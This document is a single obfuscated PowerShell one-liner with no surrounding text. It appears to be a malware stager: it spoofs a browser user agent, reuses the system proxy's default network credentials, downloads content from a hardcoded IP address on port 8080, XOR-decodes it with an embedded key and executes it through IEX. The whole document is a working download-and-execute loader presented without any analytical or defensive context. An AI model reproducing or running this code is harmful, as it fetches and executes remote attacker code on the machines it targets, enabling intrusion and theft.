
$Wc=NeW-ObjeCt SySTEM.Net.WebCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeadeRS.ADd('User-Agent',$u);$wc.PrOxy = [SyStem.NeT.WEbReQUeSt]::DEFauLTWeBProxy;$WC.PRoXY.CrEdENTIaLS = [SYStEM.NeT.CReDEnTiALCaChE]::DEFaulTNeTworKCREdeNtiaLS;$K='0192023a7bbd73250516f069df18b500';$i=0;[CHAr[]]$B=([CHaR[]]($wc.DOwnloaDSTRing("http://23.239.12.15:8080/index.asp")))|%{$_-BXOr$k[$i++%$K.LENgTh]};IEX ($B-jOIn'')

